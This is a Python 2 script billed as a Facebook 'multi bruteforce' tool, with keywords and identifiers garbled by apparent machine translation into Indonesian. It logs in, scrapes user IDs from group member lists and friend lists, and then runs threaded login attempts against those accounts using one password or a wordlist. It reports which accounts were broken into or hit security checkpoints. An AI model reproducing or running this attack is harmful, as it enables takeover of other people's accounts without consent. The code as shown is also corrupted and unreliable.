dari __future__ impor print_function
platform impor, os
def tampil (x):
	w = {'m': 31, 'h': 32, 'k': 33, 'b': 34, 'p': 35, 'c': 36}
	untuk saya di w:
		x = x.replace ('\ r% s'% i, '\ 033 [% s; 1m'% w [i])
	x + = '\ 033 [0m'
	x = x.replace ('\ r0', '\ 033 [0m')
	cetak (x)
jika platform.python_version (). split ('.') [0]! = '2':
	tampil ('\ rm [!] kamu menggunakan python versi% s Mohon menggunakan versi 2.x.x'% v (). split ('') [0])
	os.sys.exit ()
impor cookielib, ulang, urllib2, urllib, threading
mencoba:
	impor mekanis
kecuali ImportError:
	tampil ('\ rm [!] SepertiNya Module \ rcmechanize \ rm belum di install ...')
	os.sys.exit ()
def keluar ():
	simpan ()
	tampil ('\ rm [!] Keluar')
	os.sys.exit ()
log = 0
id_bteman = []
id_bgroup = []
fid_bteman = []
fid_bgroup = []
br = mechanize.Browser ()
br.set_handle_robots (False)
br.set_handle_equiv (Benar)
br.set_handle_referer (Benar)
br.set_cookiejar (cookielib.LWPCookieJar ())
br.set_handle_redirect (Benar)
br.set_handle_refresh (mechanize._http.HTTPRefreshProcessor (), max_time = 1)
br.addheaders = [('User-Agent', 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Presto / 2.12.423 Versi / 12.16')]
def bacaData ():
	global fid_bgroup, fid_bteman
	mencoba:
		fid_bgroup = buka (os.sys.path [0] + '/ MBFbgroup.txt', 'r'). readlines ()
	kecuali: lulus
	mencoba:
		fid_bteman = buka (os.sys.path [0] + '/ MBFbteman.txt', 'r'). readlines ()
	kecuali: lulus
def inputD (x, v = 0):
	sementara 1:
		mencoba:
			a = raw_input ('\ x1b [32; 1m% s \ x1b [31; 1m: \ x1b [33; 1m'% x)
		kecuali:
			tampil ('\ n \ rm [!] Batal')
			keluar ()
		jika v:
			jika a.upper () dalam v:
				istirahat
			lain:
				tampil ('\ rm [!] ditempatkan Opsinya Bro ...')
				terus
		lain:
			jika len (a) == 0:
				tampil ('\ rm [!] ditempatkan dengan benar')
				terus
			lain:
				istirahat
	mengembalikan a
input defM (x, d):
	sementara 1:
		mencoba:
			i = int (inputD (x))
		kecuali:
			tampil ('\ rm [!] Pilihan tidak ada')
			terus
		jika saya dalam d:
			istirahat
		lain:
			tampil ('\ rm [!] Pilihan tidak ada')
	kembali saya
def simpan ():
	jika len (id_bgroup)! = 0:
		tampil ('\ rh [*] Menyimpan hasil dari group')
		mencoba:
			buka (os.sys.path [0] + '/ MBFbgroup.txt', 'w'). tulis ('\ n'.join (id_bgroup))
			tampil ('\ rh [!] Berhasil meyimpan \ rcMBFbgroup.txt')
		kecuali:
			tampil ('\ rm [!] Gagal meyimpan')
	jika len (id_bteman)! = 0:
		tampil ('\ rh [*] Menyimpan hasil daftar Teman ...')
		mencoba:
			buka (os.sys.path [0] + '/ MBFbteman.txt', 'w'). tulis ('\ n'.join (id_bteman))
			tampil ('\ rh [!] Berhasil meyimpan \ rcMBFbgteman.txt')
		kecuali:
			tampil ('\ rm [!] Gagal meyimpan')
def buka (d):
	tampil ('\ rh [*] Membuka \ rp' + d)
	mencoba:
		x = br.open (d)
		br._factory.is_html = Benar
		x = x.read ()
	kecuali:
		tampil ('\ rm [!] Gagal dibuka \ rp' + d)
		keluar ()
	jika '<link rel = "redirect" href = "' di x:
		return buka (br.find_link (). url)
	lain:
		kembali x
def login ():
	log global
	us = inputD ('[?] Email / HP')
	pa = inputD ('[?] Kata Sandi')
	tampil ('\ rh [*] Sedang Masuk ....')
	buka ('https://m.facebook.com')
	br.select_form (nr = 0)
	br.form ['email'] = kami
	br.form ['pass'] = pa
	mengirimkan ()
	url = br.geturl ()
	jika 'save-device' di url atau 'm_sess' di url:
		tampil ('\ rh [*] Login Berhasil')
		buka ('https://mobile.facebook.com/home.php')
		nama = br.find_link (url_regex = 'logout.php'). teks
		nama = re.findall (r '\ ((. * a?) \)', nama) [0]
		tampil ('\ rh [*] Selamat datang \ rk% s \ n \ rh [*] Semoga ini adalah hari keberuntungan Mu ....'% nama)
		log = 1
	Elif 'pos pemeriksaan' di url:
		tampil ('\ rm [!] Akun kena pos pemeriksaan \ n \ rk [!] Coba Login dengan opera mini')
		keluar ()
	lain:
		tampil ('\ rm [!] Login Gagal')
def saring_id_teman (r):
	untuk saya di re.findall (r '/ teman / hovercard / mbasic / \? uid = (. *?) &', r):
		id_bteman.append (i)
		tampil ('\ rc ==> \ rb% s \ rm'% i)
def saring_id_group1 (d):
	untuk saya di re.findall (r '<h3> <a href = "/(.*?) fref = pb', d):
		jika i.find ('profile.php') == -1:
			a = i.replace ('?', '')
		lain:
			a = i.replace ('profile.php? id =', ''). ganti ('& amp;', '')
		jika tidak di id_bgroup:
			tampil ('\ rk ==> \ rc% s'% a)
			id_bgroup.append (a)
def saring_id_group0 ():
	id_group global
	sementara 1:
		id_group = inputD ('[?] Id Group')
		tampil ('\ rh [*] Mengecek Group ....')
		a = buka ('https://m.facebook.com/browse/group/members/?id='+id_group+'&start=0&listType=list_nonfriend&refid=18&_rdc=1&_rdr')
		nama = '' .join (re.findall (r '<title> (. *?) </title>', a) [0] .split () [1:])
		mencoba:
			selanjutnya = br.find_link (url_regex = '/browse/group/members/').url
			istirahat
		kecuali:
			tampil ('\ rm [!] Id yang Anda masukan salah')
			terus
	tampil ('\ rh [*] dipindahkan Id dari grup \ rc% s'% nama)
	saring_id_group1 (a)
	kembali berikutnya
def idgroup ():
	jika log! = 1:
		tampil ('\ rh [*] Login dulu bos ...')
		Gabung()
		jika log == 0:
			keluar ()
	selanjutnya = saring_id_group0 ()
	sementara 1:
		saring_id_group1 (buka (selanjutnya))
		mencoba:
			selanjutnya = br.find_link (url_regex = '/browse/group/members/').url
		kecuali:
			tampil ('\ rm [!] Hanya Dapat dikembalikan \ rh% d id'% len (id_bgroup))
			istirahat
	simpan ()
	i = inputD ('[?] Langsung Crack (y / t)', ['Y', 'T'])
	jika i.upper () == 'Y':
		return crack (id_bgroup)
	lain:
		menu kembali ()
def idteman ():
	jika log! = 1:
		tampil ('\ rh [*] Login dulu bos ...')
		Gabung()
		jika log == 0:
			keluar ()
	saring_id_teman (buka ('https://m.facebook.com/friends/center/friends/?fb_ref=fbm&ref_component=mbasic_bookmark&ref_page=XMenuController'))
	mencoba:
		selanjutnya = br.find_link (url_regex = 'friends_center_main'). url
	kecuali:
		jika len (id_teman)! = 0:
			tampil ('\ rm [!] Hanya dapat mengambil \ rp% d id'% len (id_bteman))
		lain:
			tampil ('\ rm [!] Batal')
			keluar ()
	sementara 1:
		saring_id_teman (buka (selanjutnya))
		mencoba:
			selanjutnya = br.find_link (url_regex = 'friends_center_main'). url
		kecuali:
			tampil ('\ rm [!] Hanya dapat mengambil \ rp% d id'% len (id_bteman))
			istirahat
	simpan ()
	i = inputD ('[?] Langsung Crack (y / t)', ['Y', 'T'])
	jika i.upper () == 'Y':
		return crack (id_bteman)
	lain:
		menu kembali ()
class mt (threading.Thread):
    def __init __ (self, i, p):
        threading.Lebar .__ init __ (mandiri)
        self.id = i
        self.a = 3
        self.p = p
    pembaruan def (mandiri):
        return self.a, self.id
    def run (mandiri):
        mencoba:
             data = urllib2.urlopen (urllib2.Request (url = 'https: //m.facebook.com/login.php',data=urllib.urlencode ({' email ': self.id,' pass ': self.p }), header = {'User-Agent': 'Opera / 9.80 (Android; Opera Mini / 32.0.2254 / 85. U; id) Versi Presto / 2.12.423 / 12.16'}))
        kecuali KeyboardInterrupt:
            os.sys.exit ()
        kecuali:
            self.a = 8
            os.sys.exit ()
        jika 'm_sess' di data.url atau 'save-device' di data.url:
            self.a = 1
        elif 'pos pemeriksaan' di data.url:
            self.a = 2
        lain:
            self.a = 0
def crack (d):
	i = inputD ('[?] Pake Daftar Kata Sandi / Manual (p / m)', ['P', 'M'])
	jika i.upper () == 'P':
		sementara 1:
			dir = inputD ('[?] menambahkan alamat file')
			mencoba:
				D = terbuka (dir, 'r'). Readlines ()
			kecuali:
				tampil ('\ rm [!] Gagal dibuka \ rk% s'% dir)
				terus
			istirahat
		tampil ('\ rh [*] Memulai crack dengan \ rk% d kata sandi'% len (D))
		untuk saya di D:
			i = i.replace ('\ n', '')
			jika len (i)! = 0:
				crack0 (d, i, 0)
		i = inputD ('[?] Tidak Puas dengan Hasil, Mau coba lagi (y / t)', ['Y', 'T'])
		jika i.upper () == 'Y':
			retakan kembali (d)
		lain:
			menu kembali ()
	lain:
		return crack0 (d, inputD ('[?] Sandi'), 1)
def crack0 (data, sandi, p):
	tampil ('\ rh [*] MengCrack \ rk% d Akun \ rhdengan sandi \ rm [\ rk% s \ rm]'% (len (data), sandi))
	print ('\ 033 [32; 1m [*] Cracking \ 033 [31; 1m [\ 033 [36; 1m0% \ 033 [31; 1m] \ 033 [0m', end = '')
	os.sys.stdout.flush ()
	akun_jml = []
	akun_sukses = []
	akun_cekpoint = []
	akun_error = []
	akun_gagal = []
	jml0, jml1 = 0,0
	th = []
	untuk saya dalam data:
		i = i.replace ('', '')
		jika len (i)! = 0: th.append (mt (i, sandi))
	untuk saya di th:
		jml1 + = 1
		i.daemon = Benar
		coba: i.start ()
		kecuali KeyboardInterrupt: exit ()
	sementara 1:
		mencoba:
			untuk saya di th:
				a = i.update ()
				jika a [0]! = 3 dan a [1] tidak ada di akun_jml:
					jml0 + = 1
					jika a [0] == 2:
						akun_cekpoint.append (a [1])
					elif a [0] == 1:
						akun_sukses.append (a [1])
					Elif a [0] == 0:
						akun_gagal.append (a [1])
					elif a [0] == 8:
						akun_error.append (a [1])
					cetak ('\ r \ 033 [32; 1m [*] Cracking \ 033 [31; 1m [\ 033 [36; 1m% 0,2f% s \ 033 [31; 1m] \ 033 [0m'% (float (( float (jml0) / float (jml1)) * 100), '%'), end = '')
					os.sys.stdout.flush ()
					akun_jml.append (a [1])
		kecuali KeyboardInterrupt:
			os.sys.exit ()
		mencoba:
			if threading.activeCount () == 1: break
		kecuali KeyboardInterrupt:
			keluar ()
	print ('\ r \ 033 [32; 1m [*] Cracking \ 033 [31; 1m [\ 033 [36; 1m100% \ 033 [31; 1m] \ 033 [0m')
	jika len (akun_sukses)! = 0:
		tampil ('\ rh [*] Daftar akun sukses')
		untuk saya di akun_sukses:
			tampil ('\ rh ==> \ rk% s \ rm [\ rp% s \ rm]'% (i, sandi))
	tampil ('\ rh [*] Jumlah akun berhasil \ rp% d'% len (akun_sukses))
	muncul ('\ rm [*] Jumlah akun gagal \ rp% d'% len (akun_gagal))
	muncul ('\ rk [*] Jumlah akun cekpoint \ rp% d'% len (akun_cekpoint))
	muncul ('\ rc [*] Jumlah kesalahan akun \ rp% d'% len (akun_error))
	jika p:
		i = inputD ('[?] Tidak Puas dengan Hasil, Mau coba lagi (y / t)', ['Y', 'T'])
		jika i.upper () == 'Y':
			retakan kembali (data)
		lain:
			menu kembali ()
	lain:
		kembali 0
def lanjutT ():
	fid_bteman global
	jika len (fid_bteman)! = 0:
		i = inputD ('[?] Riset Hasil Id Teman / lanjutkan (r / l)', ['R', 'L'])
		jika i.upper () == 'L':
			return crack (fid_bteman)
		lain:
			os.remove (os.sys.path [0] + '/ MBFbteman.txt')
			fid_bteman = []
	kembali 0
def lanjutG ():
	fid_bgroup global
	jika len (fid_bgroup)! = 0:
		i = inputD ('[?] Riset Hasil Id Group / lanjutkan (r / l)', ['R', 'L'])
		jika i.upper () == 'L':
			return crack (fid_bgroup)
		lain:
			os.remove (os.sys.path [0] + '/ MBFbgroup.txt')
			fid_bgroup = []
	kembali 0
menu def ():
	tampil ('' '\ rh
                     .- .- ..
                    / + / ++ //
                   / + / ++ //
            \ rk * * \ rh / + / ++ //
             \ / | / __ //
           {\ rmX \ rh} v {\ rmX \ rh} | \ rcPRX \ rh | ==========.
             ['] /' | '\ \\
                 / \ \ '
                 \ _ \ _ \ _ \ rk * \ NdZomBie
\ rk ############################################# ############
# \ rb * FACEBOOK MULTY BRUTEFORCE * \
# \ rmJangan Menggunakan Alat Ini Untuk IllegaL Tujuan \ rk #
############################################### ######### '' ')
	tampil ('' '\ rk% s \ n \ rc1 \ rhAmbil id dari grup \ n \ rc2 \ rhAmbil id dari daftar teman \ n \ rc3 \ rmKELUAR \ n \ rk% s' ''% ('#' * 20 , '#' * 20))
	i = inputM ('[?] PILIH', [1,2,3])
	jika saya == 1:
		lanjutG ()
		idgroup ()
	elif i == 2:
		lanjutT ()
		idteman ()
	elif i == 3:
		keluar ()
bacaData ()
Foto()
